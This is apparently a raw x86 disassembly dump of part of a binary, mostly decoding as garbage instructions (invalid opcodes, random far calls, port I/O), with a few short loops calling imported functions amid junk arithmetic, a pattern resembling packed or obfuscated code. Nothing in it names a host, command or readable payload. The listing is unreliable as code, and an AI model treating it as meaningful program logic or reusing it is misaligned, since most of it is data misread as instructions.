  4197b8:	fistp  DWORD PTR [edi-0x23]
  4197bb:	inc    esi
  4197bc:	sub    al,0x9c
  4197be:	pushf  
  4197bf:	ficomp WORD PTR ds:0xc39e3c78
  4197c5:	or     al,0x48
  4197c7:	xchg   ebx,eax
  4197c8:	mov    esp,DWORD PTR ds:[ebx-0x3a5bda0e]
  4197cf:	mov    eax,ds:0x4efb2fcf
  4197d4:	push   esi
  4197d5:	inc    esp
  4197d6:	psrad  mm6,QWORD PTR [esi+0x71]
  4197da:	ja     0x4197f8
  4197dc:	pop    ss
  4197dd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4197de:	fcomp  QWORD PTR [eax]
  4197e0:	call   0x93f492dc
  4197e5:	mov    eax,0x951bf7b4
  4197ea:	or     DWORD PTR [ebp-0x4d619b23],ebp
  4197f0:	jae    0x41978f
  4197f2:	mov    edx,0x900842b0
  4197f7:	mov    ebp,0x7948ba5c
  4197fc:	sahf   
  4197fd:	iret   
  4197fe:	pushf  
  4197ff:	push   0xf17f834f
  419804:	ss sbb eax,0xa93572ac
  41980a:	cmp    DWORD PTR [eax-0x7],edx
  41980d:	jp     0x4197f2
  41980f:	jno    0x419821
  419811:	mov    bh,0xf6
  419813:	outs   dx,DWORD PTR ds:[esi]
  419814:	inc    BYTE PTR [ecx+0x9]
  419817:	test   al,0x48
  419819:	xor    eax,0xd5680d90
  41981e:	mov    bh,0x4e
  419820:	xlat   BYTE PTR ds:[ebx]
  419821:	cmp    BYTE PTR [esp+ecx*4-0x2eff6727],al
  419828:	cs iret 
  41982a:	xchg   esp,eax
  41982b:	pushf  
  41982c:	and    BYTE PTR [ecx],cl
  41982e:	ja     0x41980e
  419830:	ret    0x3cd1
  419833:	jno    0x41989f
  419835:	stos   DWORD PTR es:[edi],eax
  419836:	outs   dx,DWORD PTR ds:[esi]
  419837:	retf   0xe477
  41983a:	lea    ebx,[edx+0x1a3f6ba0]
  419840:	loope  0x419815
  419842:	lods   eax,DWORD PTR ds:[esi]
  419843:	ja     0x41988d
  419845:	pop    edx
  419846:	loop   0x419883
  419848:	mov    ah,0x74
  41984a:	adc    dh,BYTE PTR [eax+0x42]
  41984d:	inc    edx
  41984e:	dec    ecx
  41984f:	in     al,dx
  419850:	shr    DWORD PTR [edx+eiz*4],1
  419853:	mov    eax,ds:0x5f5fca4
  419858:	and    DWORD PTR gs:[edx-0x10],ebp
  41985c:	mov    edi,0xaa45d188
  419861:	add    DWORD PTR [edi+0x43],edi
  419864:	out    dx,eax
  419865:	pop    esp
  419866:	sub    eax,0x3e19101b
  41986b:	mov    ebx,ds
  41986d:	in     al,dx
  41986e:	push   ebp
  41986f:	daa    
  419870:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419871:	ss cld 
  419873:	retf   
  419874:	bnd jmp 0x419842
  419877:	mov    dl,0xef
  419879:	add    DWORD PTR [ecx+0x3c338d06],esp
  41987f:	mov    esp,0x161ba2f3
  419884:	jo     0x419838
  419886:	sbb    ch,BYTE PTR [ebx+0x2c]
  419889:	push   ss
  41988a:	retf   0x7903
  41988d:	iret   
  41988e:	push   esp
  41988f:	daa    
  419890:	out    dx,ax
  419892:	stos   DWORD PTR es:[edi],eax
  419893:	jg     0x419860
  419895:	xchg   BYTE PTR [edx+0x4ed259b9],bl
  41989b:	mov    al,0x8e
  41989d:	call   0x398d:0x29e8e2bd
  4198a4:	inc    ebx
  4198a5:	loop   0x419840
  4198a7:	xor    ecx,ecx
  4198a9:	mov    ebp,DWORD PTR [ebp+0x65]
  4198ac:	sbb    DWORD PTR [edi],0xffffff95
  4198af:	out    0x11,al
  4198b1:	mov    edi,DWORD PTR [edi+eax*2+0x6755d3e2]
  4198b8:	dec    ecx
  4198b9:	mov    dh,0xfe
  4198bb:	in     eax,dx
  4198bc:	or     eax,0xc6d6775c
  4198c1:	lods   eax,DWORD PTR ds:[esi]
  4198c2:	dec    dl
  4198c4:	sbb    edx,DWORD PTR [edx+0x445e6475]
  4198ca:	push   0xbd867237
  4198cf:	inc    edi
  4198d0:	adc    eax,0x72c42e87
  4198d5:	fnstsw WORD PTR [ebx+0x522d72dc]
  4198db:	test   DWORD PTR [edi+edx*2-0x35e6a90b],esi
  4198e2:	es shl ecx,1
  4198e5:	cdq    
  4198e6:	inc    ecx
  4198e7:	xor    al,BYTE PTR [eax+ebp*8+0x7f]
  4198eb:	xchg   edx,eax
  4198ec:	pop    ebx
  4198ed:	xchg   esi,eax
  4198ee:	ret    
  4198ef:	cmp    esi,eax
  4198f1:	into   
  4198f2:	add    eax,edx
  4198f4:	pop    ds
  4198f5:	fmul   QWORD PTR [edx+0x42]
  4198f8:	jae    0x4198e1
  4198fa:	dec    ebp
  4198fb:	dec    ebx
  4198fc:	stos   DWORD PTR es:[edi],eax
  4198fd:	call   0x4afebf2a
  419902:	dec    DWORD PTR [ebx+eiz*2+0x43]
  419906:	lods   al,BYTE PTR ds:[esi]
  419907:	hlt    
  419908:	push   0x8ce95a0e
  41990d:	add    edi,0xa7000832
  419913:	enter  0xf9e7,0x94
  419917:	mov    cl,0xcb
  419919:	jle    0x4198a2
  41991b:	sahf   
  41991c:	add    eax,0xba868ec7
  419921:	xchg   edx,eax
  419922:	xchg   edx,eax
  419924:	push   edi
  419925:	mov    al,0x8f
  419927:	dec    ecx
  419928:	xlat   BYTE PTR ds:[ebx]
  419929:	xor    DWORD PTR [ebx+eax*8+0x5e8dca21],edi
  419930:	adc    eax,0x7b360743
  419935:	loopne 0x419960
  419937:	inc    esi
  419938:	jne    0x41993d
  41993a:	loop   0x419945
  41993c:	mov    esp,0xef38ac25
  419941:	xchg   esi,eax
  419942:	iret   
  419943:	inc    ebx
  419944:	cmp    al,0x59
  419946:	scas   eax,DWORD PTR es:[edi]
  419947:	push   ss
  419948:	inc    edi
  419949:	sub    DWORD PTR [ecx+0x2492f1e4],eax
  41994f:	lods   eax,DWORD PTR ds:[esi]
  419950:	push   edi
  419951:	push   esi
  419952:	sbb    eax,0xb4eb7e1a
  419957:	sub    al,0xd5
  419959:	aad    0x3f
  41995b:	hlt    
  41995c:	sahf   
  41995d:	mov    dl,0x25
  41995f:	sub    DWORD PTR [esp-0x5dcb2f26],eax
  419966:	jns    0x4198fe
  419968:	stos   BYTE PTR es:[edi],al
  419969:	repz sti 
  41996b:	mov    ecx,?
  41996d:	push   cs
  41996e:	push   ebp
  41996f:	bound  esi,QWORD PTR [eax-0x79919207]
  419975:	jg     0x4199d0
  419977:	shl    ebp,cl
  419979:	ds push 0x66
  41997c:	jne    0x419935
  41997e:	lds    edx,FWORD PTR [ebp-0x4d]
  419981:	cwde   
  419982:	pop    ecx
  419983:	mov    dl,0x62
  419985:	vpcmpeqb xmm3,xmm1,XMMWORD PTR [edx+ebx*2-0x49f9017a]
  41998e:	jae    0x4199c8
  419990:	push   es
  419991:	sar    DWORD PTR [edx-0x7b],1
  419994:	adc    eax,0xf012c6f9
  419999:	int3   
  41999a:	ins    BYTE PTR es:[edi],dx
  41999b:	int    0x18
  41999d:	xor    ebp,DWORD PTR [esi+0x35]
  4199a0:	add    eax,0x6f68dc70
  4199a5:	dec    edi
  4199a6:	xchg   ebp,eax
  4199a7:	mov    bl,0x1
  4199a9:	or     BYTE PTR [ecx+edx*4-0x56528f75],al
  4199b0:	stc    
  4199b1:	cmp    al,0xd6
  4199b3:	xchg   ebx,edx
  4199b5:	sysenter 
  4199b7:	pop    esp
  4199b8:	aaa    
  4199b9:	mov    bh,0x7b
  4199bb:	out    0xa7,al
  4199bd:	in     eax,dx
  4199be:	adc    ebp,DWORD PTR [ebx]
  4199c0:	xlat   BYTE PTR ds:[ebx]
  4199c1:	adc    ecx,0x1fe4
  4199c7:	xor    esi,esi
  4199c9:	xor    DWORD PTR ds:0x42aa6d,0x2675
  4199d3:	mov    DWORD PTR [ebp-0x28],esi
  4199d6:	mov    DWORD PTR ds:0x42aae1,0x12
  4199e0:	cmp    DWORD PTR ds:0x42aae1,0x0
  4199e7:	je     0x419a88
  4199ed:	cmp    DWORD PTR ds:0x42aae1,0x16
  4199f4:	jne    0x419a15
  4199fa:	push   0x8ec2
  4199ff:	push   DWORD PTR [ebp-0x24]
  419a02:	push   0x4fb2
  419a07:	push   0x17f0
  419a0c:	push   DWORD PTR [ebp-0x20]
  419a0f:	call   DWORD PTR ds:0x41d11c
  419a15:	mov    ecx,DWORD PTR ds:0x42aae1
  419a1b:	dec    ecx
  419a1c:	mov    DWORD PTR ds:0x42aae1,ecx
  419a22:	jmp    0x4199e0
  419a27:	mov    DWORD PTR ds:0x42a9c5,0x1b
  419a31:	cmp    DWORD PTR ds:0x42a9c5,0x0
  419a38:	je     0x419a88
  419a3e:	cmp    DWORD PTR ds:0x42a9c5,0x5
  419a45:	jne    0x419a54
  419a4b:	push   DWORD PTR [ebp-0x14]
  419a4e:	call   DWORD PTR ds:0x41d1fc
  419a54:	cmp    DWORD PTR ds:0x42a9c5,0x6
  419a5b:	jne    0x419a6e
  419a61:	mov    ecx,DWORD PTR ds:0x42a9c5
  419a67:	dec    ecx
  419a68:	mov    DWORD PTR ds:0x42a9c5,ecx
  419a6e:	xor    ecx,ecx
  419a70:	or     ecx,DWORD PTR ds:0x42a9c5
  419a76:	dec    ecx
  419a77:	mov    DWORD PTR ds:0x42a9c5,ecx
  419a7d:	jmp    0x419a31
  419a82:	adc    DWORD PTR ds:0x42aa65,ebx
  419a88:	mov    DWORD PTR [ebp-0x2c],esi
  419a8b:	and    DWORD PTR ds:0x42aaa9,ecx
  419a91:	mov    DWORD PTR [ebp-0x14],esi
  419a94:	add    ecx,DWORD PTR ds:0x42aa15
  419a9a:	mov    DWORD PTR [ebp-0x8],esi
  419a9d:	mov    ecx,DWORD PTR [ebp-0x18]
  419aa0:	adc    DWORD PTR ds:0x42aa9d,0x42aa11
  419aaa:	xor    ecx,eax
  419aac:	xor    edi,edi
  419aae:	and    DWORD PTR ds:0x42aae1,0x0
  419ab8:	jmp    0x419ac8
  419abd:	mov    eax,ds:0x42aae1
  419ac2:	inc    eax
  419ac3:	mov    ds:0x42aae1,eax
  419ac8:	cmp    DWORD PTR ds:0x42aae1,0x1c
  419acf:	jae    0x419af8
  419ad5:	cmp    DWORD PTR ds:0x42aae1,0x1e
  419adc:	jne    0x419aed
  419ae2:	push   0x42aa65
  419ae7:	call   DWORD PTR ds:0x41d120
  419aed:	jmp    0x419abd
  419af2:	adc    eax,DWORD PTR ds:0x42aa2d
  419af8:	add    ecx,ebx
  419afa:	mov    DWORD PTR [ebp-0x20],ecx
  419afd:	mov    eax,ds:0x42aaa5
  419b02:	jmp    0x419d37
  419b07:	cmp    eax,0xcbcec3c5
  419b0c:	fcmovbe st,st(1)
  419b0e:	aad    0x68
  419b10:	xor    DWORD PTR [ecx+0xd],0x45
  419b14:	mov    BYTE PTR [ecx-0xd],0xd0
  419b18:	iret   
  419b19:	jg     0x419b93
  419b1b:	adc    BYTE PTR [esi+0x78],bh
  419b1e:	js     0x419b4e
  419b20:	inc    edi
  419b21:	cmp    al,0x71
  419b23:	cmc    
  419b24:	xor    eax,0x1d280c1e
  419b29:	out    dx,al
  419b2a:	push   edx
  419b2b:	cmp    eax,0xfeb22555
  419b30:	sbb    DWORD PTR [ecx],edx
  419b32:	fdivr  st,st(3)
  419b34:	std    
  419b35:	cld    
  419b36:	mov    esp,0xc0dd89fd
  419b3b:	xchg   edi,eax
  419b3c:	xchg   esp,eax
  419b3d:	inc    ebp
  419b3e:	jl     0x419ba8
  419b40:	shl    BYTE PTR [edx+0x1b6d8a71],cl
  419b46:	push   0xf39c9616
  419b4b:	add    eax,0x2077e911
  419b50:	jl     0x419b02
  419b52:	mov    cl,ch
  419b54:	dec    esi
  419b55:	leave  
  419b56:	jp     0x419b22
  419b58:	cli    
  419b59:	dec    ebx
  419b5a:	adc    dl,0x56
  419b5d:	das    
  419b5e:	imul   edx,DWORD PTR [esi-0x78],0xffffffa8
  419b62:	inc    esi
  419b63:	jmp    0xcc74e73d
  419b68:	jg     0x419bdc
  419b6a:	mov    DWORD PTR [esi-0x17],eax
  419b6d:	jae    0x419b41
  419b6f:	xor    al,BYTE PTR [esi-0x4aec8e12]
  419b75:	ins    DWORD PTR es:[edi],dx
  419b76:	cmp    eax,DWORD PTR [ebx]
  419b78:	stos   DWORD PTR es:[edi],eax
  419b79:	push   esi
  419b7a:	and    eax,DWORD PTR [edi]
  419b7c:	and    BYTE PTR [ecx+0x3a],bh
  419b7f:	lods   al,BYTE PTR ds:[esi]
  419b80:	int    0xd1
  419b82:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419b83:	dec    ebp
  419b84:	mov    al,0x81
  419b86:	les    esi,FWORD PTR [eiz*4-0x7ac2c5d4]
  419b8d:	out    0x8e,eax
  419b8f:	mov    bh,al
  419b91:	add    BYTE PTR [ecx+0x5a],cl
  419b94:	dec    ecx
  419b95:	das    
  419b96:	into   
  419b97:	mov    eax,0xd353d13b
  419b9c:	fmulp  st(2),st
  419b9e:	ins    BYTE PTR es:[edi],dx
  419b9f:	or     al,0xa7
  419ba1:	dec    ebp
  419ba2:	mov    ah,0xbf
  419ba4:	es pop edi
  419ba6:	stos   DWORD PTR es:[edi],eax
  419ba7:	ins    BYTE PTR es:[edi],dx
  419ba8:	add    esi,ebx
  419baa:	push   ss
  419bab:	sbb    edi,DWORD PTR [eax]
  419bad:	retf   0x1108
  419bb0:	jb     0x419b53
  419bb2:	push   ebx
  419bb3:	sahf   
  419bb4:	jnp    0x419c33
  419bb6:	ins    DWORD PTR es:[edi],dx
  419bb7:	sbb    BYTE PTR [edi-0x33750f4],bh
  419bbd:	mov    edi,0xfcbed147
  419bc2:	fbld   TBYTE PTR [edi+0x6ddf4a34]
  419bc8:	jne    0x419c40
  419bca:	xlat   BYTE PTR ds:[ebx]
  419bcb:	or     dh,BYTE PTR [edx-0x82d0810]
  419bd1:	adc    DWORD PTR [edi],0x410a88b3
  419bd7:	push   0xc9708f3d
  419bdc:	adc    ch,bl
  419bde:	jb     0x419b8c
  419be0:	daa    
  419be1:	sub    ebp,DWORD PTR ds:0xa6c39748
  419be7:	enter  0xd8cf,0xfb
  419beb:	aam    0x3b
  419bed:	dec    ecx
  419bee:	and    esp,DWORD PTR [ecx+0x13c745a3]
  419bf4:	bsr    ebp,DWORD PTR [edi+eiz*8+0x410954b8]
  419bfc:	cmp    bl,BYTE PTR [edx-0x31ba2e25]
  419c02:	test   BYTE PTR [ecx-0x473eecc8],ah
  419c08:	add    bh,BYTE PTR [esi+0x1db611a1]
  419c0e:	les    ebp,FWORD PTR [edx+ecx*2-0x3e]
  419c12:	repz fmul QWORD PTR [esi]
  419c15:	mov    al,BYTE PTR [ebp+0x7fb57c2]
  419c1b:	mov    dh,0xd8
  419c1d:	sub    edi,ebp
  419c1f:	xchg   edx,eax
  419c20:	ds mov ecx,0x159be623
  419c26:	aad    0xa1
  419c28:	popw   ds
  419c2a:	fs aam 0x9d
  419c2d:	mov    ds:0xcbb41024,eax
  419c32:	mov    ds:0x1a670d3b,al
  419c37:	push   ss
  419c38:	idiv   BYTE PTR [edi]
  419c3a:	repz xor ch,BYTE PTR [ebp+0x142d1d33]
  419c41:	cs pop ebx
  419c43:	or     BYTE PTR [edx-0x3],ah
  419c46:	xchg   ch,bl
  419c48:	inc    esi
  419c49:	xor    eax,0x18b27bd1
  419c4e:	call   0xdb9d:0x717cc054
  419c55:	repnz pop ss
  419c57:	sti    
  419c58:	lahf   
  419c59:	jmp    0x419c7b
  419c5b:	pop    esp
  419c5c:	icebp  
  419c5d:	jno    0x419c38
  419c5f:	mov    BYTE PTR [esp+eiz*8+0x16],ah
  419c63:	and    eax,0xcf99fd83
  419c68:	rol    bh,1
  419c6a:	cmp    ebx,DWORD PTR [ebx+0x4b]
  419c6d:	sub    eax,0x2976f4e0
  419c72:	fs sbb eax,0xae46a59f
  419c78:	and    eax,0xd2e814ac
  419c7d:	test   DWORD PTR [ebx-0xa],0x9322d732
  419c84:	dec    esi
  419c85:	(bad)  
  419c86:	sub    al,0xfb
  419c88:	(bad)  
  419c89:	sahf   
  419c8a:	push   ss
  419c8b:	mov    BYTE PTR [esi],dl
  419c8d:	dec    esi
  419c8e:	sbb    DWORD PTR [edx],edi
  419c90:	sahf   
  419c91:	inc    eax
  419c92:	in     al,0x4d
  419c94:	sbb    eax,DWORD PTR [edi-0x1d7dfe08]
  419c9a:	cmc    
  419c9b:	sub    bl,BYTE PTR [ecx]
  419c9d:	xlat   BYTE PTR ds:[ebx]
  419c9e:	dec    ebp
  419c9f:	mov    al,ds:0xdd5e7e70
  419ca4:	push   ebp
  419ca5:	out    dx,al
  419ca6:	jmp    0x1c81:0xbf9c19c1
  419cad:	push   ds
  419cae:	jae    0x419c70
  419cb0:	out    0xbb,al
  419cb2:	sub    eax,0x7c66af72
  419cb7:	add    BYTE PTR [esi],0x70
  419cba:	das    
  419cbb:	add    bh,ch
  419cbd:	inc    ebx
  419cbe:	cmp    eax,0x697ea622
  419cc3:	inc    ebp
  419cc4:	out    dx,al
  419cc5:	push   esi
  419cc6:	test   eax,0xf6bff278
  419ccb:	mov    ecx,0xb573381b
  419cd0:	dec    edx
  419cd1:	mul    bl
  419cd3:	cmp    dl,ch
  419cd5:	adc    DWORD PTR [eax],0x52
  419cd8:	repz icebp 
  419cda:	push   0x25
  419cdc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419cdd:	outs   dx,DWORD PTR ds:[esi]
  419cde:	jmp    0xbeaecd9e
  419ce3:	in     al,dx
  419ce4:	cs xchg esp,eax
  419ce6:	xchg   esp,eax
  419ce7:	xchg   BYTE PTR [edi-0x2b],ch
  419cea:	jne    0x419ce2
  419cec:	in     eax,0xc7
  419cee:	mov    ds:0xb9d53003,al
  419cf3:	repz imul esp,DWORD PTR [ebx],0xffffffdf
  419cf7:	sub    DWORD PTR [esi-0x19],0xffffff94
  419cfb:	xlat   BYTE PTR ds:[ebx]
  419cfc:	adc    DWORD PTR [esi+0x13],edx
  419cff:	add    BYTE PTR [esi+ebp*2],dh
  419d02:	jmp    0x56c0:0xd859157e
  419d09:	sub    BYTE PTR [edx],ah
  419d0b:	aas    
  419d0c:	inc    ebp
  419d0d:	or     bh,0xef
  419d10:	jecxz  0x419cf0
  419d12:	fwait
  419d13:	call   0xc732:0xb413720e
  419d1a:	nop
  419d1b:	aad    0xd2
  419d1d:	retf   0xe202
  419d20:	push   ss
  419d21:	jno    0x419d02
  419d23:	cld    
  419d24:	xor    ch,BYTE PTR [ecx]
  419d26:	int3   
  419d27:	dec    esi
  419d28:	fdiv   QWORD PTR ds:0xc0169348
  419d2e:	mov    ds:0x3673d750,al
  419d33:	dec    ebx
  419d34:	jmp    0x419db1
  419d36:	mov    cl,0x8b
  419d38:	inc    ebp
  419d39:	loopne 0x419d4a
  419d3b:	test   BYTE PTR [ecx+0x4000000b],cl
  419d41:	mov    eax,DWORD PTR [ebp-0x4]
  419d44:	xor    eax,0x7510850
  419d49:	sbb    DWORD PTR ds:0x42aa99,0x42a9cd
  419d53:	add    eax,ebx
  419d55:	mov    DWORD PTR ds:0x42aae9,0x7077
  419d5f:	cmp    edi,eax
  419d61:	mov    DWORD PTR ds:0x42aa9d,0xab2
  419d6b:	jmp    0x419fa0
  419d70:	(bad)  
  419d71:	into   
  419d72:	ror    bh,cl
  419d74:	(bad)  
  419d76:	leave  
  419d77:	(bad)  
  419d78:	push   0xffffffe9
  419d7a:	or     esi,esi
  419d7c:	dec    ebp
  419d7d:	or     al,0x60
  419d7f:	mov    esi,0x787fcde8
  419d84:	adc    BYTE PTR [esi+0x78],bh
  419d87:	js     0x419d64
  419d89:	add    eax,0x4afbdbf8
  419d8e:	shl    DWORD PTR [edi],0x88
  419d91:	in     eax,dx
  419d92:	pop    esp
  419d93:	cmp    BYTE PTR [edi+0x31],bl
  419d96:	scas   eax,DWORD PTR es:[edi]
  419d97:	sub    al,0x45
  419d99:	ret    
  419d9a:	icebp  
  419d9b:	int3   
  419d9c:	jnp    0x419d61
  419d9e:	and    bh,cl
  419da0:	mov    dh,0xad
  419da2:	call   0xc356:0x5c850314
  419da9:	addr16 pop ss
  419dab:	pop    edx
  419dac:	dec    esp
  419dad:	inc    ebx
  419dae:	jbe    0x419e2c
  419db0:	cmc    
  419db1:	(bad)  
  419db3:	cld    
  419db4:	idiv   BYTE PTR [edi-0x2c]
  419db7:	das    
  419db8:	repnz pop esi
  419dba:	adc    eax,ebp
  419dbc:	and    eax,0x25b3253
  419dc1:	fild   QWORD PTR [ebp-0x1c2b8428]
  419dc7:	push   esp
  419dc8:	mov    ah,0x5
  419dca:	and    eax,0x54670c73
  419dcf:	(bad)  
  419dd0:	out    dx,al
  419dd1:	imul   edi,DWORD PTR [eax+eiz*1+0x5a],0x5c997d26
  419dd9:	or     esi,DWORD PTR cs:[ebx-0x5c]
  419ddd:	fistp  QWORD PTR [ebx+0x4e9be98c]
  419de3:	push   esp
  419de4:	mov    ds:0xeaa0d783,eax
  419de9:	lods   al,BYTE PTR ds:[esi]
  419dea:	(bad)  
  419deb:	jecxz  0x419e46
  419ded:	xchg   esp,eax
  419dee:	push   cs
  419def:	dec    edi
  419df0:	dec    edi
  419df1:	mov    ebx,eax
  419df3:	inc    ecx
  419df4:	repnz outs dx,DWORD PTR ds:[esi]
  419df6:	jbe    0x419dc6
  419df8:	test   edx,ecx
  419dfa:	cld    
  419dfb:	dec    ebx
  419dfc:	push   ebp
  419dfd:	sbb    al,0x77
  419dff:	pop    es
  419e00:	sbb    BYTE PTR [ecx+eax*8],dh
  419e03:	xchg   DWORD PTR [edi],esp
  419e05:	xor    esi,esi
  419e07:	pushf  
  419e08:	adc    BYTE PTR [edx-0x53252ca5],dl
  419e0e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419e0f:	mov    ecx,0x411ce6a2
  419e14:	add    esp,ebp
  419e16:	inc    esp
  419e17:	mov    gs,WORD PTR [esi]
  419e19:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419e1a:	mov    esi,0x6bcd1e88
  419e1f:	dec    edx
  419e20:	jo     0x419e4d
  419e22:	dec    edi
  419e23:	cmp    eax,esi
  419e25:	xchg   edi,eax
  419e26:	xchg   edi,eax
  419e27:	adc    DWORD PTR [esi-0x51],0x4c
  419e2b:	jnp    0x419db6
  419e2d:	iret   
  419e2e:	push   ds
  419e2f:	xor    DWORD PTR [edx],edx
  419e31:	pop    esi
  419e32:	cli    
  419e33:	jp     0x419e07
  419e35:	add    al,0xe8
  419e37:	lea    edx,[ebx+0x565a67ff]
  419e3d:	out    0xa1,al
  419e3f:	xor    ch,al
  419e41:	pop    ebx
  419e42:	into   
  419e43:	mov    ds:0xf594b0ff,eax
  419e48:	cdq    
  419e49:	repz cmp ecx,DWORD PTR [ebp+edi*4+0x5e]
  419e4e:	xchg   ebp,eax
  419e4f:	arpl   WORD PTR [edx],si
  419e51:	call   0x83e1693f
  419e56:	test   eax,0x5cf7a238
  419e5b:	enter  0x27c7,0xea
  419e5f:	jmp    0x4c2c:0x5640a192
  419e66:	imul   edx,DWORD PTR [eax-0x3a],0x4d9974a8
  419e6d:	add    al,0xde
  419e6f:	add    edx,eax
  419e71:	mov    cl,0x94
  419e73:	jne    0x419e72
  419e75:	addr16 jo 0x419eea
  419e78:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419e79:	sbb    BYTE PTR [ecx+ecx*4-0x50],bh
  419e7d:	(bad)  
  419e7e:	or     al,0x5d
  419e80:	cwde   
  419e81:	adc    dl,BYTE PTR [esp+eax*1-0x14]
  419e85:	add    ebx,DWORD PTR [edi+eax*4+0x790279db]
  419e8c:	leave  
  419e8d:	inc    BYTE PTR [ecx+0x5a9abc86]
  419e93:	push   edi
  419e94:	loop   0x419ef4
  419e96:	shr    ah,cl
  419e98:	sbb    al,0xfa
  419e9a:	aas    
  419e9b:	dec    DWORD PTR [ebp-0x145f86fe]
  419ea1:	adc    al,0xb7
  419ea3:	call   0x3c37:0x2074c914
  419eaa:	loopne 0x419ea6
  419eac:	mov    ebx,0x7c9342e
  419eb1:	fisttp WORD PTR [eax+ebx*8-0x79a9abb3]
  419eb8:	ret    0xe6ff
  419ebb:	fist   WORD PTR [ebp+esi*8+0x3d]
  419ebf:	push   eax
  419ec0:	out    0x68,eax
  419ec2:	loopne 0x419eda
  419ec4:	dec    ebp
  419ec5:	lahf   
  419ec6:	jmp    0xc63f:0x474367c
  419ecd:	cwde   
  419ece:	ss aaa 
  419ed0:	repnz dec eax
  419ed2:	xchg   edi,eax
  419ed3:	xor    DWORD PTR [edx+0x5fafc1d0],eax
  419ed9:	jl     0x419ecd
  419edb:	ins    DWORD PTR es:[edi],dx
  419edc:	lea    ebp,[edi+0x3f]
  419edf:	aas    
  419ee0:	lock jl 0x419efa
  419ee3:	push   0xb5bcf716
  419ee8:	or     DWORD PTR [ecx],0x1d45acf8
  419eee:	lds    eax,FWORD PTR [edi-0xc]
  419ef1:	pop    edx
  419ef2:	es (bad) 
  419ef4:	cmp    al,0xcb
  419ef6:	loope  0x419ed8
  419ef8:	push   es
  419ef9:	push   cs
  419efa:	clc    
  419efb:	test   BYTE PTR [ebp+edx*1-0x3e7e3190],cl
  419f02:	and    cl,BYTE PTR [esi]
  419f04:	push   0x53ac5e83
  419f09:	pushf  
  419f0a:	sbb    BYTE PTR [ecx],0xd7
  419f0d:	sbb    DWORD PTR [edi],ecx
  419f0f:	call   0x396870c7
  419f14:	icebp  
  419f15:	or     eax,0xac2accd9
  419f1a:	test   BYTE PTR [edi-0x2],ah
  419f1d:	stos   DWORD PTR es:[edi],eax
  419f1e:	mov    dl,0xa8
  419f20:	int    0xe2
  419f22:	punpckldq mm4,DWORD PTR [ebx-0x65c86750]
  419f29:	loope  0x419f64
  419f2b:	cmp    eax,0xd269c2a0
  419f30:	mov    ecx,0xd32d3eea
  419f35:	ror    BYTE PTR [eax+0x1573f6a3],cl
  419f3b:	pusha  
  419f3c:	(bad)  
  419f3e:	adc    DWORD PTR [edx],edx
  419f40:	test   BYTE PTR [edi-0x29],al
  419f43:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419f44:	mov    eax,0xe924456c
  419f49:	retf   0x868
  419f4c:	mov    esi,0xab14afa
  419f51:	cwde   
  419f52:	aas    
  419f53:	iret   
  419f54:	ror    BYTE PTR [ecx+esi*8+0x4bcb25d4],1
  419f5b:	fs cmp edx,esp
  419f5e:	out    0xe6,al
  419f60:	adc    edx,esi
  419f62:	rol    esi,0x93
  419f65:	es xor ebx,ebp
  419f68:	and    BYTE PTR ds:0x68870fee,bl
  419f6e:	or     ch,BYTE PTR [esi+eiz*2]
  419f71:	adc    dl,BYTE PTR [edx+0x14]
  419f74:	xor    ebp,DWORD PTR [edx]
  419f76:	lds    edx,FWORD PTR [eax+eax*2+0x3a]
  419f7a:	inc    edi
  419f7b:	clc    
  419f7c:	fldcw  WORD PTR [ecx]
  419f7e:	mov    dh,0x34
  419f80:	imul   edx,DWORD PTR [eax],0xfffffffd
  419f83:	rcr    bl,0xe7
  419f86:	inc    ebp
  419f87:	mov    ecx,0x2c4057ba
  419f8c:	js     0x419f95
  419f8e:	xor    DWORD PTR [ecx],ebx
  419f90:	pop    ds
  419f91:	and    DWORD PTR [ecx*4+0x39df39a3],ebp
  419f98:	adc    al,0xcf
  419f9a:	and    BYTE PTR [esi],0xe8
  419f9d:	mov    BYTE PTR [ebx],dh
  419f9f:	lahf   
  419fa0:	jne    0x41a637
  419fa6:	add    DWORD PTR ds:0x42aa25,0x42a9c1
  419fb0:	push   DWORD PTR [ebp+0x8]
  419fb3:	or     DWORD PTR ds:0x42aad1,0x48c2
  419fbd:	call   0x4175e1
  419fc2:	and    DWORD PTR ds:0x42aa95,edi
  419fc8:	mov    DWORD PTR [ebp-0x20],eax
  419fcb:	jmp    0x41a200
  419fd0:	aas    
  419fd1:	into   
  419fd2:	leave  
  419fd3:	int    0xd9
  419fd5:	(bad)  
  419fd7:	into   
  419fd8:	fwait
  419fd9:	or     BYTE PTR [eax-0x74],0x54
  419fdd:	lods   al,BYTE PTR ds:[esi]
  419fde:	dec    ebp
  419fdf:	or     al,0x80
  419fe1:	sar    DWORD PTR [edi+0x78],cl
  419fe4:	adc    BYTE PTR [esi+0x78],bh
  419fe7:	js     0x419f93
  419fe9:	sub    BYTE PTR [ebp+0x2a],ah
  419fec:	rol    bh,1
  419fee:	pop    ebx
  419fef:	jbe    0x41a021
  419ff1:	jg     0x419f74
  419ff3:	(bad)  
  419ff4:	mov    DWORD PTR [esi-0x101bf217],esi
  419ffa:	jns    0x41a00f
  419ffc:	pop    eax
  419ffd:	sub    ah,BYTE PTR es:[ebx-0x7441b121]
  41a004:	in     al,0x85
  41a006:	call   0x9458ada4
  41a00b:	out    dx,eax
  41a00c:	mov    eax,ds:0x287c6b95
  41a011:	dec    eax
  41a012:	cmp    esp,DWORD PTR [eax-0x1ffaaa02]
  41a018:	sbb    DWORD PTR [edx-0x49d7f83f],esp
  41a01e:	cmp    dh,BYTE PTR [ebp+edi*4-0x6e4676bd]
  41a025:	call   0x57b1:0xe0d1e781
  41a02c:	jns    0x41a062
  41a02e:	data16 mov ch,0xc2
  41a031:	and    bh,BYTE PTR [edi]
  41a033:	pop    ds
  41a034:	or     eax,0x5737eb6e
  41a039:	sub    eax,esp
  41a03b:	xor    al,0xa5
  41a03d:	std    
  41a03e:	mov    ch,0x79
  41a040:	jecxz  0x41a071
  41a042:	ss sbb dl,dh
  41a045:	out    dx,al
  41a046:	shl    DWORD PTR [ebx+0x17],1
  41a049:	lock push eax
